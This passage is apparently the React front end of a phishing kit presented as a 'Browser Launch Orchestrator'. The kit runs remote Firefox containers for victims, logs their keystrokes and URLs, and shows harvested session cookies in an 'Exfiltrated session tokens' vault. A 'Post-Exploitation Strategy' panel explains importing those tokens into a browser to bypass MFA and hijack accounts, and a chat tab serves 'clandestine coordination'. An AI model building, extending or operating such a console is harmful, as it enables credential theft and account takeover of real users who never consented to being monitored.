                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Docker-Based Orchestration</p>
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                <div className="space-y-6">
                  <h4 className="font-serif italic text-xl">The Browser Image</h4>
                  <p className="text-sm opacity-70 leading-relaxed">
                    Each user session is isolated in a <strong>jlesage/firefox</strong> container. This image provides a robust Firefox environment accessible via a web browser (noVNC/HTML5) on port 5800.
                  </p>
                  <div className="bg-[#141414] p-4 rounded text-[10px] font-mono text-emerald-400 overflow-x-auto">
                    <pre>{`# Pull the image
docker pull jlesage/firefox:latest

# Environment Logic
PORT: 5800 (Web Interface)
ARGS: --kiosk mode enabled by default`}</pre>
                  </div>
                </div>
                <div className="space-y-6">
                  <h4 className="font-serif italic text-xl">The Orchestrator</h4>
                  <p className="text-sm opacity-70 leading-relaxed">
                    The Node.js backend acts as the control plane. By mounting the Docker Socket, it can programmatically spawn, monitor, and destroy Firefox containers on the host machine.
                  </p>
                  <div className="bg-[#141414] p-4 rounded text-[10px] font-mono text-blue-400 overflow-x-auto">
                    <pre>{`# docker-compose.yml
services:
  orchestrator:
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - DOCKER_IMAGE=jlesage/firefox:latest`}</pre>
                  </div>
                </div>
              </div>
            </section>

            <section className="pt-12 border-t border-[#141414] border-opacity-10">
              <div className="flex items-center gap-4 mb-8">
                <div className="w-10 h-10 border border-[#141414] flex items-center justify-center">
                  <ShieldAlert className="w-5 h-5" />
                </div>
                <h4 className="font-serif italic text-xl">The Network Firewall</h4>
              </div>
              <p className="text-sm opacity-70 leading-relaxed mb-6">
                To restrict user interaction with the fleet, the Orchestrator dynamically manages the <strong>DOCKER-USER</strong> iptables chain. Rules are applied at the host level, ensuring that traffic is filtered before it even reaches the container network.
              </p>
              <div className="bg-[#141414] p-6 rounded text-[10px] font-mono text-amber-500">
                <pre>{`# Example Rule Generation
iptables -I DOCKER-USER -s 192.168.1.100 -j DROP
iptables -L DOCKER-USER -n`}</pre>
              </div>
            </section>

            <section className="pt-12 border-t border-[#141414] border-opacity-10">
              <h4 className="font-serif italic text-xl mb-6">Deployment Checklist</h4>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
                {[
                  { title: "Host Server", desc: "Linux VPS with Docker Engine installed." },
                  { title: "MX Resolver", desc: "Active network access for DNS MX lookups." },
                  { title: "Identity DB", desc: "SQLite or Firestore for domain mappings." },
                  { title: "Net Security", desc: "iptables configured for DOCKER-USER chain." }
                ].map((item, i) => (
                  <div key={i} className="p-6 border border-[#141414] border-opacity-10">
                    <span className="text-[8px] uppercase tracking-widest opacity-40 mb-2 block">Requirement {i+1}</span>
                    <h5 className="font-bold text-xs mb-2">{item.title}</h5>
                    <p className="text-[10px] opacity-60 leading-relaxed">{item.desc}</p>
                  </div>
                ))}
              </div>
            </section>
          </div>
        </div>
      ) : mainTab === "logs" ? (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-6xl mx-auto">
            <div className="flex items-center justify-between mb-12">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <Key className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Security & Session Audit</h2>
                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Real-time interaction logging</p>
                </div>
              </div>
              <button 
                onClick={fetchLogs}
                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
              >
                <RefreshCw className="w-3 h-3" /> Refresh Logs
              </button>
            </div>

            <div className="bg-white border border-[#141414] border-opacity-10 overflow-hidden">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-gray-50 border-b border-[#141414] border-opacity-10">
                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Timestamp</th>
                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Session</th>
                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Interaction</th>
                    <th className="p-4 text-[10px] uppercase tracking-widest opacity-40 font-bold">Context URL</th>
                  </tr>
                </thead>
                <tbody className="font-mono text-[11px]">
                  {auditLogs.length === 0 ? (
                    <tr>
                      <td colSpan={4} className="p-12 text-center opacity-40 uppercase tracking-widest">No audit data available</td>
                    </tr>
                  ) : (
                    auditLogs.map((log) => (
                      <tr key={log.id} className="border-b border-[#141414] border-opacity-5 hover:bg-gray-50 transition-all">
                        <td className="p-4 opacity-50 whitespace-nowrap">{new Date(log.timestamp).toLocaleString()}</td>
                        <td className="p-4"><span className="px-2 py-0.5 bg-gray-100 rounded text-[9px]">{log.container_id}</span></td>
                        <td className="p-4 font-bold">{log.content}</td>
                        <td className="p-4 opacity-50 truncate max-w-xs" title={log.url}>{log.url}</td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
            
            <div className="mt-8 p-6 border border-amber-500 border-opacity-20 bg-amber-50 rounded">
              <div className="flex gap-4 items-start">
                <ShieldCheck className="w-5 h-5 text-amber-600 mt-1" />
                <div className="space-y-1">
                  <h5 className="text-xs font-bold text-amber-900">Compliance Notice</h5>
                  <p className="text-[10px] text-amber-800 leading-relaxed opacity-80">
                    The Session Auditor is active on all managed containers. Every interaction is cryptographically hashed and logged to the central orchestrator for security compliance and incident response. Administrators are responsible for ensuring data privacy alignment with local regulations.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : mainTab === "vault" ? (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-6xl mx-auto">
            <div className="flex items-center justify-between mb-12">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <Lock className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Identity & Session Vault</h2>
                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Exfiltrated session tokens</p>
                </div>
              </div>
              <button 
                onClick={fetchSessions}
                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
              >
                <RefreshCw className="w-3 h-3" /> Sync Vault
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {capturedSessions.length === 0 ? (
                <div className="col-span-full p-12 border border-[#141414] border-dashed border-opacity-20 text-center opacity-40">
                  <p className="font-mono text-xs uppercase tracking-widest">No exfiltrated sessions available.</p>
                </div>
              ) : (
                capturedSessions.map((session) => (
                  <div key={session.id} className="bg-white border border-[#141414] border-opacity-10 p-6 space-y-4 hover:shadow-xl transition-all">
                    <div className="flex justify-between items-start">
                      <div className="space-y-1">
                        <p className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-400">Target Provider</p>
                        <h4 className="font-serif italic text-lg">{session.domain}</h4>
                      </div>
                      <div className="flex flex-col items-end gap-2">
                        <div className="px-2 py-0.5 bg-[#141414] text-white text-[8px] font-mono tracking-tighter uppercase rounded">
                          SECURED
                        </div>
                        <button 
                          onClick={() => setVisibleJson(prev => ({ ...prev, [session.id]: !prev[session.id] }))}
                          className={`p-1.5 border border-[#141414] border-opacity-10 transition-all ${visibleJson[session.id] ? 'bg-[#141414] text-white' : 'hover:bg-gray-50'}`}
                          title="View Raw JSON"
                        >
                          <Code className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                    
                    <AnimatePresence>
                      {visibleJson[session.id] ? (
                        <motion.div 
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: "auto" }}
                          exit={{ opacity: 0, height: 0 }}
                          className="overflow-hidden"
                        >
                          <div className="bg-[#141414] p-4 rounded text-[9px] font-mono text-blue-300 overflow-x-auto max-h-48 overflow-y-auto">
                            <pre>{JSON.stringify(JSON.parse(session.raw_json), null, 2)}</pre>
                          </div>
                        </motion.div>
                      ) : (
                        <motion.div
                          initial={{ opacity: 0 }}
                          animate={{ opacity: 1 }}
                          exit={{ opacity: 0 }}
                          className="space-y-3"
                        >
                          <div>
                            <p className="text-[8px] uppercase tracking-widest opacity-40 mb-1">Key Name</p>
                            <code className="text-[10px] bg-gray-100 px-1 rounded block truncate">{session.cookie_name}</code>
                          </div>
                          <div>
                            <p className="text-[8px] uppercase tracking-widest opacity-40 mb-1">Token Secret</p>
                            <div className="relative group">
                              <code className="text-[9px] bg-[#141414] text-[#E4E3E0] p-2 rounded block break-all font-mono opacity-20 group-hover:opacity-100 transition-opacity blur-[2px] group-hover:blur-none">
                                {session.cookie_value}
                              </code>
                              <div className="absolute inset-0 flex items-center justify-center group-hover:hidden pointer-events-none">
                                <span className="text-[8px] text-[#141414] font-bold uppercase tracking-widest bg-[#E4E3E0] px-2 py-1 shadow-sm">Hover to Reveal</span>
                              </div>
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <div className="pt-4 border-t border-gray-100 flex justify-between items-center text-[9px] font-mono opacity-50 uppercase">
                      <span>Source: {session.container_id}</span>
                      <span>{new Date(session.timestamp).toLocaleTimeString()}</span>
                    </div>
                  </div>
                ))
              )}
            </div>
            
            <div className="mt-12 p-8 border border-[#141414] border-opacity-5 bg-white bg-opacity-50">
              <h5 className="font-serif italic text-xl mb-4">Post-Exploitation Strategy</h5>
              <p className="text-[11px] opacity-60 leading-relaxed max-w-2xl">
                The session vault captures identity tokens in real-time as users navigate the remote browser. These tokens can be imported into a local browser using extension-based cookie managers to bypass MFA and hijack authenticated sessions. Use the "Sync Vault" button to pull the latest exfiltrated data from the orchestrator's central database.
              </p>
            </div>
          </div>
        </div>
      ) : mainTab === "chat" ? (
        <div className="flex-grow flex flex-col p-8 bg-[#E4E3E0] overflow-hidden">
          <div className="max-w-4xl mx-auto w-full flex-grow flex flex-col overflow-hidden bg-white border border-[#141414] border-opacity-10 shadow-sm">
            {/* Chat Header */}
            <div className="p-6 border-b border-[#141414] border-opacity-10 flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 bg-[#141414] text-white flex items-center justify-center">
                  <MessageSquare className="w-5 h-5" />
                </div>
                <div>
                  <h2 className="text-xl font-light">Ops Command Chat</h2>
                  <p className="text-[10px] opacity-50 uppercase tracking-widest font-mono">Real-time clandestine coordination</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                <span className="text-[9px] uppercase tracking-widest font-bold font-mono">Channel Verified</span>
              </div>
            </div>

            {/* Chat Messages */}
            <div className="flex-grow overflow-y-auto p-6 space-y-4">
              {messages.length === 0 ? (
                <div className="h-full flex items-center justify-center opacity-30 italic text-sm">
                  Waiting for transmission...
                </div>
              ) : (
                messages.map((msg) => (
                  <div key={msg.id} className={`flex flex-col ${msg.user_id === visitorId ? "items-end" : "items-start"}`}>
                    <div className="flex items-center gap-2 mb-1 px-1">
                      <span className="text-[8px] font-bold uppercase tracking-widest text-[#141414] opacity-40">{msg.username}</span>
                      <span className="text-[8px] opacity-20">{new Date(msg.timestamp).toLocaleTimeString()}</span>
                    </div>
                    <div className={`max-w-[80%] p-4 text-xs leading-relaxed ${
                      msg.user_id === visitorId 
                        ? "bg-[#141414] text-white" 
                        : "bg-gray-100 border border-[#141414] border-opacity-5"
                    }`}>
                      {msg.message}
                    </div>
                  </div>
                ))
              )}
            </div>

            {/* Chat Input */}
            <form onSubmit={handleSendMessage} className="p-6 border-t border-[#141414] border-opacity-10 bg-gray-50 flex gap-4">
              <input 
                type="text" 
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                placeholder="Secure message transmission..."
                className="flex-grow bg-white border border-[#141414] border-opacity-10 p-4 text-xs focus:outline-none focus:ring-1 focus:ring-[#141414] font-mono"
              />
              <button 
                type="submit"
                disabled={!chatInput.trim()}
                className="bg-[#141414] text-white px-8 py-4 text-[10px] uppercase tracking-widest font-bold disabled:opacity-20 hover:bg-opacity-90 transition-all flex items-center gap-2"
              >
                <Send className="w-3 h-3" /> Execute
              </button>
            </form>
          </div>
        </div>
      ) : mainTab === "scaling" ? (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-6xl mx-auto">
            <div className="flex items-center justify-between mb-12">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <Zap className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Elastic Scaling Monitor</h2>
                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Autonomous Resource Management</p>
                </div>
              </div>
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2 px-4 py-2 bg-white border border-[#141414] border-opacity-10 text-[10px] uppercase tracking-widest">
                  <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                  Auto-Scaler: Online
                </div>
                <button 
                  onClick={fetchScalingMetrics}
                  className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
                >
                  <RefreshCw className="w-3 h-3" /> Refresh Metrics
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
              <div className="bg-white border border-[#141414] border-opacity-10 p-8 shadow-sm">
                <h4 className="text-[10px] uppercase tracking-[0.2em] font-bold opacity-30 mb-4">Current Load</h4>
                <div className="flex items-baseline gap-2">
                  <span className="text-4xl font-light">{scalingMetrics[0]?.total_cpu.toFixed(1) || "0.0"}%</span>
                  <span className="text-xs opacity-40 font-mono uppercase">Total CPU</span>
                </div>
                <div className="mt-4 h-1 bg-gray-100 w-full overflow-hidden">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: `${scalingMetrics[0]?.total_cpu || 0}%` }}
                    className="h-full bg-[#141414]"
                  />
                </div>
              </div>
              <div className="bg-white border border-[#141414] border-opacity-10 p-8 shadow-sm">
                <h4 className="text-[10px] uppercase tracking-[0.2em] font-bold opacity-30 mb-4">Memory Allocation</h4>
                <div className="flex items-baseline gap-2">
                  <span className="text-4xl font-light">{(scalingMetrics[0]?.total_memory / 1024).toFixed(1) || "0.0"}</span>
                  <span className="text-xs opacity-40 font-mono uppercase">GB Used</span>
                </div>
                <div className="mt-4 text-[10px] opacity-40 uppercase tracking-widest">Shared Memory Cluster</div>
              </div>
              <div className="bg-white border border-[#141414] border-opacity-10 p-8 shadow-sm">
                <h4 className="text-[10px] uppercase tracking-[0.2em] font-bold opacity-30 mb-4">Active Fleet</h4>
                <div className="flex items-baseline gap-2">
                  <span className="text-4xl font-light">{scalingMetrics[0]?.active_containers || 0}</span>
                  <span className="text-xs opacity-40 font-mono uppercase">Instances</span>
                </div>
                <div className="mt-4 flex items-center gap-2">
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded ${
                    scalingMetrics[0]?.strategy === 'THROTTLING' ? 'bg-orange-100 text-orange-700' : 'bg-emerald-100 text-emerald-700'
                  }`}>
                    {scalingMetrics[0]?.strategy || 'IDLE'}
                  </span>
                </div>
              </div>
            </div>

            <div className="bg-white border border-[#141414] border-opacity-10 overflow-hidden shadow-sm">
              <div className="p-6 border-b border-[#141414] border-opacity-10 flex items-center justify-between bg-gray-50 bg-opacity-50">
                <h3 className="text-sm font-bold uppercase tracking-widest">Telemetry History</h3>
                <span className="text-[9px] font-mono opacity-40">LAST 50 SCALE EVENTS</span>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead className="bg-[#141414] text-[#E4E3E0] text-[9px] uppercase tracking-widest">
                    <tr>
                      <th className="px-6 py-4 font-bold">Snapshot_ID</th>
                      <th className="px-6 py-4 font-bold">Fleet_Size</th>
                      <th className="px-6 py-4 font-bold">CPU_Util</th>
                      <th className="px-6 py-4 font-bold">MEM_Alloc</th>
                      <th className="px-6 py-4 font-bold">Scaling_Strategy</th>
                      <th className="px-6 py-4 font-bold text-right">Timestamp</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#141414] divide-opacity-5">
                    {scalingMetrics.map((m) => (
                      <tr key={m.id} className="hover:bg-gray-50 transition-colors">
                        <td className="px-6 py-4 text-[10px] font-mono opacity-60">metrics_{m.id}</td>
                        <td className="px-6 py-4 text-[10px] font-bold">{m.active_containers} Units</td>
                        <td className="px-6 py-4 text-[10px] font-mono">{m.total_cpu.toFixed(2)}%</td>
                        <td className="px-6 py-4 text-[10px] font-mono">{(m.total_memory / 1024).toFixed(1)}GB</td>
                        <td className="px-6 py-4">
                          <span className={`text-[9px] font-mono uppercase tracking-widest px-2 py-1 ${
                            m.strategy === 'THROTTLING' ? 'text-orange-600 bg-orange-50' : 'text-emerald-600 bg-emerald-50'
                          }`}>
                            {m.strategy}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-[10px] text-right font-mono opacity-50">{new Date(m.timestamp).toLocaleTimeString()}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div className="mt-8 grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="p-8 border border-[#141414] border-opacity-10 bg-white shadow-sm">
                <h5 className="font-serif italic text-xl mb-4">Reaping Policy</h5>
                <p className="text-[11px] opacity-60 leading-relaxed">
                  To optimize resource costs and security surface area, the orchestrator automatically terminates instances that have remained idle for more than 5 minutes. Idle detection is based on audit heartbeat activity (keystrokes) and session sync events.
                </p>
              </div>
              <div className="p-8 border border-[#141414] border-opacity-10 bg-[#141414] text-white shadow-xl">
                <div className="flex items-center gap-3 mb-4">
                  <ShieldCheck className="w-5 h-5 text-emerald-400" />
                  <h5 className="text-[10px] uppercase tracking-widest font-bold">Dynamic Cluster Safety</h5>
                </div>
                <p className="text-[11px] opacity-70 leading-relaxed font-light">
                  If global CPU utilization exceeds 80%, the orchestrator enters "THROTTLING" mode, preventing new browser spawns until resource availability returns to optimal levels. This ensures cluster stability and prevents hardware exhaustion.
                </p>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div className="flex-grow p-12 bg-[#E4E3E0] overflow-y-auto">
          <div className="max-w-6xl mx-auto">
            <div className="flex items-center justify-between mb-12">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#141414] text-white flex items-center justify-center">
                  <Box className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-3xl font-light tracking-tight">Active Container Registry</h2>
                  <p className="text-xs opacity-50 font-mono uppercase tracking-widest">Live Fleet Monitoring</p>
                </div>
              </div>
              <button 
                onClick={fetchContainers}
                className="flex items-center gap-2 px-4 py-2 border border-[#141414] text-[10px] uppercase tracking-widest hover:bg-[#141414] hover:text-[#E4E3E0] transition-all"
              >
                <RefreshCw className="w-3 h-3" /> Refresh Registry
              </button>
            </div>

            <div className="grid grid-cols-1 gap-4">
              {activeContainers.length === 0 ? (
                <div className="p-12 border border-[#141414] border-dashed border-opacity-20 text-center opacity-40">
                  <p className="font-mono text-xs uppercase tracking-widest">No active containers found in cluster.</p>
                </div>
              ) : (
                activeContainers.map((container) => (
                  <motion.div 
                    key={container.id}
                    className="bg-white border border-[#141414] border-opacity-10 p-6 flex flex-col md:flex-row md:items-center justify-between gap-6"
                  >
                    <div className="flex items-center gap-6">
                      <div className={`w-2 h-2 rounded-full ${container.status === 'running' ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`} />
                      <div className="space-y-1">
                        <h4 className="font-mono text-sm font-bold tracking-tight">{container.name}</h4>
                        <p className="text-[10px] opacity-50 uppercase tracking-widest">{container.email} • {container.domain}</p>
                      </div>
                    </div>

                    <div className="flex flex-wrap gap-8 items-center">
                      <div className="space-y-1">
                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Network Address</span>
                        <p className="text-[10px] font-mono">{container.ip_address}</p>
                      </div>
                      <div className="space-y-1">
                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Created</span>
                        <p className="text-[10px] font-mono">{new Date(container.created_at).toLocaleTimeString()}</p>
                      </div>
                      <div className="space-y-1">
                        <span className="text-[8px] uppercase tracking-widest opacity-40 block">Status</span>
                        <p className={`text-[10px] font-mono uppercase ${container.status === 'running' ? 'text-emerald-600' : 'text-red-600'}`}>{container.status}</p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2">
                      <a 
                        href={container.remote_url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="px-4 py-2 bg-[#141414] text-white text-[10px] uppercase tracking-widest flex items-center gap-2 hover:bg-opacity-80 transition-all"
                      >
                        <ExternalLink className="w-3 h-3" /> Connect
                      </a>
                      <button 
                        onClick={() => handleRestartContainer(container.id)}
                        className="p-2 border border-[#141414] border-opacity-20 hover:bg-gray-100 transition-all"
                        title="Restart Container"
                      >
                        <RefreshCw className="w-3 h-3" />
                      </button>
                      <button 
                        onClick={() => handleTerminateContainer(container.id)}
                        className="p-2 border border-red-500 border-opacity-20 text-red-500 hover:bg-red-50 transition-all"
                        title="Terminate Container"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                    </div>
                  </motion.div>
                ))
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  </main>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 border-t border-[#141414] p-4 flex justify-between items-center text-[9px] uppercase tracking-[0.2em] opacity-40 bg-[#E4E3E0]">
        <span>Node: EU-WEST-2</span>
        <span>Runtime: Node.js + SQLite</span>
        <span>© 2026 Browser Launch Orchestrator</span>
      </footer>
    </div>
  );
}
